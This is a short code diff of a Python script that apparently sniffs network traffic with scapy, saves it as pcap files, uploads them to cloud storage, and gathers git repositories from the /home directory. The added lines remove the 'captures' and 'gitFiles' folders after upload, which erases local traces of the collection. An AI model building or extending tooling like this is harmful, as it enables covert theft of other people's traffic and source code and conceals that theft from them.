@@ -56,6 +56,7 @@ def sniff():
         scapy.wrpcap(dest_folder,capture, append=True)
         uploadToDrive(dest_folder,mime_types['pcap']) 
         os.remove(dest_folder)
+    os.rmdir('captures')
         
     return
     
@@ -158,7 +159,11 @@ def uploadToDrive(fileName,mimeType):
 
 def get_git_repos():
 
-    os.system('mkdir gitFiles')
+    try:
+
+        os.system('mkdir gitFiles')
+    except:
+        pass
 
     os.chdir('/home')
     #print(os.path.expanduser("~"))
@@ -193,6 +198,8 @@ def get_git_repos():
             continue
     for file in os.listdir(cwd+"/gitFiles"):
         os.remove(cwd+"/gitFiles/"+file)
+    
+    os.rmdir(cwd+'/gitFiles')
     os.chdir(cwd)
     return 
 
